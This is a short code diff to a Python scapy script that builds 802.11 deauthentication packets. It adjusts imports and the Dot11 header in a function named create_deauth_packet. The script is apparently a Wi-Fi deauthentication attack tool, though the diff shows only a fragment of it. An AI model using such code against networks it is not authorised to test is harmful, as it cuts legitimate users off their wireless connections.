@@ -7,7 +7,7 @@ from typing import List, Tuple
 from loguru import logger
 import concurrent.futures
 from scapy.all import sniff, sendp #, RadioTap, Dot11, Dot11Deauth, Dot11Elt
-from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11Elt
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
 
 # Constants
 INTERFACE_MONITOR_1 = "wlan1"
@@ -109,7 +109,8 @@ def create_deauth_packet(target: str, bssid: str, reason: int) -> RadioTap:
     :param reason: Reason code for the deauth.
     :return: The created deauthentication packet.
     """
-    dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid) # Dot11(addr1=dst, addr2=src, addr3=bssid)
+    # dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid) # Dot11(addr1=dst, addr2=src, addr3=bssid)
+    dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid) # Dot11(addr1=dst, addr2=src, addr3=bssid)
     packet = RadioTap() / dot11 / Dot11Deauth(reason=reason)
     return packet
 
